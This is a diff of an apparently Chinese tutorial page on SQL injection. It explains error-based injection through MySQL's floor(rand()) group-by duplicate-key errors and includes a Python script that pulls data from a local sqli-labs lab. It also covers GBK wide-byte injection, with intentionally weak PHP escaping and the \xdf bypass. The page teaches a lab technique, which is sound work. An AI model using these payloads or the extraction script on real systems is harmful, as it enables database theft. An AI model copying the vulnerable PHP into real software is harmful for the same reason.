+SQL 语句： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">floor</span>(rand(<span class="number">12323</span>) <span class="operator">*</span> <span class="number">2</span>) <span class="keyword">as</span> a, <span class="built_in">count</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">from</span> users</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> a;</span><br></pre></td></tr></table></figure></div></p>
+<p>在执行 <code>group by</code>
+语句的过程中维护了一个「虚拟表」（实际上也就是结果表），具体进行如下步骤：
+- 对于 <code>users</code> 表的每一行，执行
+<code>floor(rand(12323) * 2)</code> 获得一个唯一键
+<code>a</code>（这里用唯一约束，因此称之为唯一键）。 - 如果
+<code>a</code> 在虚拟表中存在则将对应的 <code>count(*)</code> 项加 1 。
+- 如果 <code>a</code> 在虚拟表中不存在则 <strong>再次执行</strong>
+<code>floor(rand(12323) * 2)</code> 获得一个唯一键 <code>b</code> 然后将
+<code>b</code> 插入到虚拟表中并且对应 <code>count(*)</code> 项设为 1
+。</p>
+<p>根据这一特性我们可以得出结论：<code>floor(rand(12323) * 2)</code>
+第一次产生的值不会统计进去而是将下一个产生的值统计进去，然后总共统计表的数据条数个数。因此执行结果如下：
+<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/edbdebdd4b119797c5b6ddc33f4be444.png"
-                      alt="在这里插入图片描述"
-                ><br>然而这里存在一个十分严重的问题，如果再次执行 <code>floor(rand(12323) * 2)</code> 获得一个唯一键 <code>b</code> 与原本的唯一键 <code>a</code> <strong>可能不同</strong>，也就是说插入虚拟表中的唯一键 <code>b</code> 可能在虚拟表中已经存在，这就违反了虚拟表中唯一键唯一的原则，因此可能会产生报错。</p>
-<p>显然触发报错的随机序列的最短长度为 4（形如 <code>ABAB</code> 的序列），也就是说这种方式要求查询一个行数至少为 4 的表格才能确保触发报错。我们将随机种子修改为 14 则结果如下：<br><img  
+                     data-src="images/edbdebdd4b119797c5b6ddc33f4be444.png"
+                     
+alt="在这里插入图片描述" 
+                > 然而这里存在一个十分严重的问题，如果再次执行
+<code>floor(rand(12323) * 2)</code> 获得一个唯一键 <code>b</code>
+与原本的唯一键 <code>a</code>
+<strong>可能不同</strong>，也就是说插入虚拟表中的唯一键 <code>b</code>
+可能在虚拟表中已经存在，这就违反了虚拟表中唯一键唯一的原则，因此可能会产生报错。</p>
+<p>显然触发报错的随机序列的最短长度为 4（形如 <code>ABAB</code>
+的序列），也就是说这种方式要求查询一个行数至少为 4
+的表格才能确保触发报错。我们将随机种子修改为 14 则结果如下： <img 
+
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/183654d7415c8d969b5b186050e17107.png"
-                      alt="在这里插入图片描述"
-                ><br>从报错中我们发现重复的唯一键 <code>0</code> 在报错信息中输出出来了，因此我们可以在键中插入我们需要输出的查询结果就可以实现信息泄露。</p>
-<h3 id="泄露原语-2"><a href="#泄露原语-2" class="headerlink" title="泄露原语"></a>泄露原语</h3><ul>
-<li>为了泄露信息需要将 <code>query_data</code> 拼接到 <code>floor(rand(14) * 2)</code> 前，这里为了区分边界在中间插入字符 <code>~</code> 。  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat((<span class="operator">&lt;</span>query_data<span class="operator">&gt;</span>), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand(<span class="number">14</span>) <span class="operator">*</span> <span class="number">2</span>))</span><br></pre></td></tr></table></figure></div></li>
-<li>下面的语句不能直接用 <code>and</code> 拼接到 <code>where</code> 后面的条件语句中。  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), concat((<span class="operator">&lt;</span>query_data<span class="operator">&gt;</span>), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand(<span class="number">14</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure></div>
-  因为该查询结果的列数不为 1 ，不能参与逻辑运行，会报如下错误：  <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[21000][1241] Operand should contain 1 column(s)</span><br></pre></td></tr></table></figure></div></li>
-<li>为了能将该报错注入的查询语句拼接到 <code>where</code> 后面的条件语句中，需要在外面再套一个 <code>select</code> ，完整语句如下：  <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), concat((<span class="operator">&lt;</span>query_data<span class="operator">&gt;</span>), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand(<span class="number">14</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) <span class="keyword">as</span> b)#<span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure></div></li>
-<li>虚拟表报错只能输出键的前 64 字节，考虑到标记符 <code>~</code> 每次最多泄露 63 字节，需要多次泄露。</li>
-</ul>
+                     data-src="images/183654d7415c8d969b5b186050e17107.png"
+                     
+alt="在这里插入图片描述" 
+                > 从报错中我们发现重复的唯一键 <code>0</code>
+在报错信息中输出出来了，因此我们可以在键中插入我们需要输出的查询结果就可以实现信息泄露。
+### 泄露原语 - 为了泄露信息需要将 <code>query_data</code> 拼接到
+<code>floor(rand(14) * 2)</code> 前，这里为了区分边界在中间插入字符
+<code>~</code> 。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat((<span class="operator">&lt;</span>query_data<span class="operator">&gt;</span>), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand(<span class="number">14</span>) <span class="operator">*</span> <span class="number">2</span>))</span><br></pre></td></tr></table></figure></div> - 下面的语句不能直接用 <code>and</code>
+拼接到 <code>where</code> 后面的条件语句中。 <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), concat((<span class="operator">&lt;</span>query_data<span class="operator">&gt;</span>), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand(<span class="number">14</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a</span><br></pre></td></tr></table></figure></div>
+因为该查询结果的列数不为 1 ，不能参与逻辑运行，会报如下错误：
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[21000][1241] Operand should contain 1 column(s)</span><br></pre></td></tr></table></figure></div> - 为了能将该报错注入的查询语句拼接到 <code>where</code>
+后面的条件语句中，需要在外面再套一个 <code>select</code>
+，完整语句如下： <div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>), concat((<span class="operator">&lt;</span>query_data<span class="operator">&gt;</span>), <span class="number">0x7e</span>, <span class="built_in">floor</span>(rand(<span class="number">14</span>) <span class="operator">*</span> <span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) <span class="keyword">as</span> b)#<span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure></div> - 虚拟表报错只能输出键的前 64
+字节，考虑到标记符 <code>~</code> 每次最多泄露 63
+字节，需要多次泄露。</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:8888/sqli-labs/Less-5/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">query_data</span>):</span><br><span class="line">    offset = <span class="number">1</span></span><br><span class="line">    res_data = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        html_content = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?id=1&#x27; and (select count(*) from (select count(*),concat(substr((<span class="subst">&#123;query_data&#125;</span>),<span class="subst">&#123;offset&#125;</span>,63),0x7e,floor(rand(14)*2)) as a from information_schema.tables group by a) as b)%23&quot;</span>).text</span><br><span class="line">        <span class="built_in">print</span>(html_content)</span><br><span class="line">        part_data = re.search(<span class="string">r&quot;Duplicate entry &#x27;([^&lt;\s]+)~&quot;</span>, html_content)</span><br><span class="line">        <span class="keyword">if</span> part_data == <span class="literal">None</span>: <span class="keyword">break</span></span><br><span class="line">        part_data = part_data.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(part_data)</span><br><span class="line">        res_data += part_data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(part_data) &lt; <span class="number">63</span>: <span class="keyword">break</span></span><br><span class="line">        offset += <span class="built_in">len</span>(part_data)</span><br><span class="line">    <span class="keyword">return</span> res_data</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_data(<span class="string">&quot;select database()&quot;</span>))</span><br></pre></td></tr></table></figure></div>
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入（Wide Byte Injection），有时也称为双字节注入，是一种SQL注入攻击技术，主要针对使用多字节字符集（如GBK、Big5等）的应用程序。攻击者利用这种字符集的特性，通过巧妙构造的输入数据来绕过SQL注入防护机制，从而执行恶意SQL代码。</p>
-<h2 id="MySQL-中的编码规则"><a href="#MySQL-中的编码规则" class="headerlink" title="MySQL 中的编码规则"></a>MySQL 中的编码规则</h2><p>在 MySQL 中，字符集（character set）相关的系统变量定义了服务器和客户端如何处理字符数据。这些变量可以影响数据在数据库中的存储、传输和表示方式。通过 <code>SHOW VARIABLES LIKE &#39;%character%&#39;</code> 命令，可以查看与字符集相关的系统变量及其当前的设置。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%character%&#x27;;</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name            | Value                                                  |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| character_set_client     | utf8                                                   |</span><br><span class="line">| character_set_connection | utf8                                                   |</span><br><span class="line">| character_set_database   | utf8                                                   |</span><br><span class="line">| character_set_filesystem | binary                                                 |</span><br><span class="line">| character_set_results    | utf8                                                   |</span><br><span class="line">| character_set_server     | utf8                                                   |</span><br><span class="line">| character_set_system     | utf8                                                   |</span><br><span class="line">| character_sets_dir       | D:\phpstudy_pro\Extensions\MySQL5.7.26\share\charsets\ |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br></pre></td></tr></table></figure></div>
-
+<h1 id="宽字节注入">宽字节注入</h1>
+<p>宽字节注入（Wide Byte
+Injection），有时也称为双字节注入，是一种SQL注入攻击技术，主要针对使用多字节字符集（如GBK、Big5等）的应用程序。攻击者利用这种字符集的特性，通过巧妙构造的输入数据来绕过SQL注入防护机制，从而执行恶意SQL代码。
+## MySQL 中的编码规则 在 MySQL 中，字符集（character
+set）相关的系统变量定义了服务器和客户端如何处理字符数据。这些变量可以影响数据在数据库中的存储、传输和表示方式。通过
+<code>SHOW VARIABLES LIKE '%character%'</code>
+命令，可以查看与字符集相关的系统变量及其当前的设置。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%character%&#x27;;</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name            | Value                                                  |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| character_set_client     | utf8                                                   |</span><br><span class="line">| character_set_connection | utf8                                                   |</span><br><span class="line">| character_set_database   | utf8                                                   |</span><br><span class="line">| character_set_filesystem | binary                                                 |</span><br><span class="line">| character_set_results    | utf8                                                   |</span><br><span class="line">| character_set_server     | utf8                                                   |</span><br><span class="line">| character_set_system     | utf8                                                   |</span><br><span class="line">| character_sets_dir       | D:\phpstudy_pro\Extensions\MySQL5.7.26\share\charsets\ |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br></pre></td></tr></table></figure></div></p>
 <ul>
-<li><strong>character_set_client</strong>：Web 后端代码输入的字符集。当 Web 后端代码向数据库系统发送数据时，这些数据会被假定是使用这个字符集进行编码的。</li>
-<li><strong>character_set_connection</strong>：Web 后端代码与数据库系统之间的连接使用的字符集。它指定了 Web 后端代码和数据库系统之间数据传输时所采用的字符集。</li>
+<li><strong>character_set_client</strong>：Web 后端代码输入的字符集。当
+Web
+后端代码向数据库系统发送数据时，这些数据会被假定是使用这个字符集进行编码的。</li>
+<li><strong>character_set_connection</strong>：Web
+后端代码与数据库系统之间的连接使用的字符集。它指定了 Web
+后端代码和数据库系统之间数据传输时所采用的字符集。</li>
 <li><strong>character_set_database</strong>：数据库系统默认的字符集。当在数据库中创建新表时，如果没有显式指定字符集，将会使用这个字符集。</li>
-<li><strong>character_set_filesystem</strong>：数据库系统文件系统默认的字符集。在 MySQL 中，文件名和路径名可能需要使用这个字符集来进行编码。</li>
-<li><strong>character_set_results</strong>：查询结果返回给 Web 后端代码时使用的字符集。即，当从数据库系统中检索数据时，数据将会被转换成这个字符集后返回给 Web 后端代码。</li>
+<li><strong>character_set_filesystem</strong>：数据库系统文件系统默认的字符集。在
+MySQL 中，文件名和路径名可能需要使用这个字符集来进行编码。</li>
+<li><strong>character_set_results</strong>：查询结果返回给 Web
+后端代码时使用的字符集。即，当从数据库系统中检索数据时，数据将会被转换成这个字符集后返回给
+Web 后端代码。</li>
 <li><strong>character_set_server</strong>：数据库系统使用的默认字符集。这个字符集用于数据库系统内部的默认字符处理和操作，例如默认的数据库、表、列字符集，如果这些没有单独指定的话。</li>
-<li><strong>character_set_system</strong>：数据库系统的系统字符集。这个字符集主要用于系统级的元数据存储和操作，例如系统表和信息架构（information schema）。MySQL 在启动时会根据系统环境选择一个默认的字符集。</li>
-<li><strong>character_sets_dir</strong>：字符集文件存储的目录。数据库系统使用这个目录来加载字符集的定义文件。</li>
-</ul>
-<h2 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h2><p>例如下面这段 PHP 代码：</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 转义所有的反斜杠 (\ -&gt; \\)</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">preg_quote</span>(<span class="string">&quot;/\\/&quot;</span>), <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\\\&#x27;</span>), <span class="variable">$string</span>);  </span><br><span class="line">    <span class="comment">// 使用反斜杠转义单引号 (&#x27; -&gt; \&#x27;)</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">preg_quote</span>(<span class="string">&quot;/&#x27;/&quot;</span>), <span class="title function_ invoke__">preg_quote</span>(<span class="string">&quot;\\&#x27;&quot;</span>), <span class="variable">$string</span>);  </span><br><span class="line">    <span class="comment">// 使用反斜杠转义双引号 (&quot; -&gt; \&quot;)</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;/&quot;/&#x27;</span>), <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&quot;&#x27;</span>), <span class="variable">$string</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 获取用户输入的id并进行转义处理</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 设置MySQL连接的字符集为gbk</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">    <span class="comment">// 构造SQL查询语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">// 获取查询结果</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>程序将用户输入中的特殊字符做了如下转义：</p>
-<ul>
+<li><strong>character_set_system</strong>：数据库系统的系统字符集。这个字符集主要用于系统级的元数据存储和操作，例如系统表和信息架构（information
+schema）。MySQL 在启动时会根据系统环境选择一个默认的字符集。</li>
+<li><strong>character_sets_dir</strong>：字符集文件存储的目录。数据库系统使用这个目录来加载字符集的定义文件。
+## 基本原理 例如下面这段 PHP 代码： <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 转义所有的反斜杠 (\ -&gt; \\)</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">preg_quote</span>(<span class="string">&quot;/\\/&quot;</span>), <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\\\&#x27;</span>), <span class="variable">$string</span>);  </span><br><span class="line">    <span class="comment">// 使用反斜杠转义单引号 (&#x27; -&gt; \&#x27;)</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">preg_quote</span>(<span class="string">&quot;/&#x27;/&quot;</span>), <span class="title function_ invoke__">preg_quote</span>(<span class="string">&quot;\\&#x27;&quot;</span>), <span class="variable">$string</span>);  </span><br><span class="line">    <span class="comment">// 使用反斜杠转义双引号 (&quot; -&gt; \&quot;)</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;/&quot;/&#x27;</span>), <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&quot;&#x27;</span>), <span class="variable">$string</span>);  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">// 获取用户输入的id并进行转义处理</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">check_addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="comment">// 设置MySQL连接的字符集为gbk</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line">    <span class="comment">// 构造SQL查询语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="comment">// 获取查询结果</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+程序将用户输入中的特殊字符做了如下转义：</li>
 <li><code>\</code> → <code>\\</code></li>
-<li><code>&#39;</code> → <code>\&#39;</code></li>
-<li><code>&quot;</code> → <code>\&quot;</code></li>
+<li><code>'</code> → <code>\'</code></li>
+<li><code>"</code> → <code>\"</code></li>
 </ul>
-<p>在 sql 语句中，上述字符转义后只会当成普通字符，而不会当做 sql 语句的一部分。例如 <code>select &#39;\&#39;&#39;;</code> 的结果为 <code>&#39;</code>。</p>
-<p>然而由于 <code>SET NAMES gbk</code> 将数据库的字符集改为了 gbk 编码，因此<strong>数据库会认为后端代码传入数据库中的字符串为 gbk 编码</strong>。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set names gbk;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#x27;%character%&#x27;;</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name            | Value                                                  |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| character_set_client     | gbk                                                    |</span><br><span class="line">| character_set_connection | gbk                                                    |</span><br><span class="line">| character_set_database   | gbk                                                    |</span><br><span class="line">| character_set_filesystem | binary                                                 |</span><br><span class="line">| character_set_results    | gbk                                                    |</span><br><span class="line">| character_set_server     | utf8                                                   |</span><br><span class="line">| character_set_system     | utf8                                                   |</span><br><span class="line">| character_sets_dir       | D:\phpstudy_pro\Extensions\MySQL5.7.26\share\charsets\ |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br></pre></td></tr></table></figure></div>
-<p><strong>但是事实上 php 传入的字符串仍是 utf-8 编码</strong>，因此如果我们在 <code>&#39;</code> 前面放一个 <code>\xdf</code> 字符，那么在 gbk 编码下 <code>\xdf</code> 符号位置位，应当和后面的 <code>\x5c</code> 组成一个汉字「運」，这就使得 <code>\</code> 对 <code>&#39;</code> 的转义失效，从而造成 <code>&#39;</code> 的闭合引发 sql 注入。<br><img  
+<p>在 sql 语句中，上述字符转义后只会当成普通字符，而不会当做 sql
+语句的一部分。例如 <code>select '\'';</code> 的结果为
+<code>'</code>。</p>
+<p>然而由于 <code>SET NAMES gbk</code> 将数据库的字符集改为了 gbk
+编码，因此<strong>数据库会认为后端代码传入数据库中的字符串为 gbk
+编码</strong>。 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set names gbk;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#x27;%character%&#x27;;</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| Variable_name            | Value                                                  |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br><span class="line">| character_set_client     | gbk                                                    |</span><br><span class="line">| character_set_connection | gbk                                                    |</span><br><span class="line">| character_set_database   | gbk                                                    |</span><br><span class="line">| character_set_filesystem | binary                                                 |</span><br><span class="line">| character_set_results    | gbk                                                    |</span><br><span class="line">| character_set_server     | utf8                                                   |</span><br><span class="line">| character_set_system     | utf8                                                   |</span><br><span class="line">| character_sets_dir       | D:\phpstudy_pro\Extensions\MySQL5.7.26\share\charsets\ |</span><br><span class="line">+--------------------------+--------------------------------------------------------+</span><br></pre></td></tr></table></figure></div> <strong>但是事实上 php 传入的字符串仍是
+utf-8 编码</strong>，因此如果我们在 <code>'</code> 前面放一个
+<code>\xdf</code> 字符，那么在 gbk 编码下 <code>\xdf</code>
+符号位置位，应当和后面的 <code>\x5c</code> 组成一个汉字「運」，这就使得
+<code>\</code> 对 <code>'</code> 的转义失效，从而造成 <code>'</code>
+的闭合引发 sql 注入。 <img 
+
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2024/11/11/SQL%20%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/images/e7f10d98b1fe54ea39c4b331e85b3823.png"
-                      alt="在这里插入图片描述"
